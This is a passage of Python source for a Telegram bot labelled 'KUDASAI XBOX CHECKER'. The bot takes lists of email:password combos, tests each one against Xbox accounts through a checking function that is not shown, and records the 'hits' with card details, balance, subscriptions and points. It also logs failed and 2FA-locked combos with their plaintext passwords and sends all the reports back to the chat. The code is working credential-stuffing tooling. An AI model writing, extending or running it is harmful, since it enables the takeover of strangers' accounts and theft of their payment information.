def log_to_file(filename, content):
    try:
        file_path = os.path.join(OUTPUT_DIR, filename)
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(content + "\n")
    except Exception as e:
        print(Fore.RED + f"[-] Error writing to {filename}: {str(e)}")

def generate_progress_bar(current, total, length=10):
    if total == 0:
        filled = 0
    else:
        filled = int(round(length * current / float(total)))
    bar = '█' * filled + '░' * (length - filled)
    percentage = int(round((current / float(total)) * 100)) if total > 0 else 0
    return f"[{bar}] {percentage}% ({current}/{total})"

async def process_accounts_with_native_engine(account_lines, chat_id, context: ContextTypes.DEFAULT_TYPE):
    for file in ["results.txt", "2fa.txt", "errors.txt"]:
        fp = os.path.join(OUTPUT_DIR, file)
        if os.path.exists(fp):
            os.remove(fp)

    valid_accounts = []
    for line in account_lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if ":" in line and "@" in line:
            parts = line.split(":")
            if len(parts) >= 2:
                email = parts[0].strip()
                password = parts[1].strip().split(" ")[0].split("\t")[0]
                valid_accounts.append((email, password))

    total = len(valid_accounts)
    if total == 0:
        await context.bot.send_message(chat_id=chat_id, text="❌ **[KUDASAI]** No valid `email:password` accounts detected in your input file.")
        return

    status_msg = await context.bot.send_message(
        chat_id=chat_id,
        text=f"🚀 **[KUDASAI] XBOX CHECKER INITIALIZED**\n\n"
             f"📊 Progress: `[░░░░░░░░░░] 0% (0/{total})`\n"
             f"🎯 Hits Found: 0\n"
             f"⏳ Current: Starting check..."
    )

    start_time = time.time()
    hits = 0
    processed = 0

    for email, password in valid_accounts:
        processed += 1
        bot_stats["total_processed"] += 1
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        progress_str = generate_progress_bar(processed, total)
        try:
            await status_msg.edit_text(
                text=f"🚀 **[KUDASAI] CHECKING IN PROGRESS**\n\n"
                     f"📊 Progress: `{progress_str}`\n"
                     f"🎯 Hits Found: {hits}\n"
                     f"📧 Checking: `{email}`",
                parse_mode="Markdown"
            )
        except Exception:
            pass

        # Execute your checking function asynchronously or via thread executor to avoid blocking the bot loop
        try:
            result = await asyncio.to_thread(check_xbox_account, email, password)
            status = result.get('status')

            if status == 'success':
                hits += 1
                bot_stats["successful"] += 1
                result_block = f"--- [{timestamp}] SUCCESS ---\n"
                result_block += f"Email: {result.get('email')}\n"
                result_block += f"Country: {result.get('country')}\n"
                result_block += f"Card: {result.get('card_details')}\n"
                result_block += f"Balance: {result.get('balance')}\n"
                result_block += f"Subscription: {result.get('purchased_items')}\n"
                result_block += f"Points: {result.get('points')}\n"
                result_block += "=" * 40 + "\n"
                log_to_file("results.txt", result_block)
            elif status == '2fa' or status == 'locked':
                bot_stats["failed"] += 1
                log_to_file("2fa.txt", f"[{timestamp}] 2FA/LOCKED ({result.get('message')}): {email}:{password}")
            else:
                bot_stats["failed"] += 1
                log_to_file("errors.txt", f"[{timestamp}] BAD ({result.get('message')}): {email}:{password}")

        except Exception as e:
            bot_stats["failed"] += 1
            log_to_file("errors.txt", f"[{timestamp}] EXCEPTION: {email}:{password} | {str(e)}")

        await asyncio.sleep(0.2)

    elapsed = round(time.time() - start_time, 2)
    
    await status_msg.edit_text(
        text=f"✅ **[KUDASAI] SCAN COMPLETED!**\n\n"
             f"📊 Total Checked: {total}\n"
             f"🎯 Hits Found: {hits}\n"
             f"⏱️ Time Taken: {elapsed} seconds\n\n"
             f"📁 Uploading reports...",
        parse_mode="Markdown"
    )

    for filename in ["results.txt", "2fa.txt", "errors.txt"]:
        file_path = os.path.join(OUTPUT_DIR, filename)
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            with open(file_path, "rb") as f:
                await context.bot.send_document(chat_id=chat_id, document=f, caption=f"📁 Report: {filename}")
            try:
                os.remove(file_path)
            except Exception:
                pass
        else:
            if os.path.exists(file_path):
                os.remove(file_path)

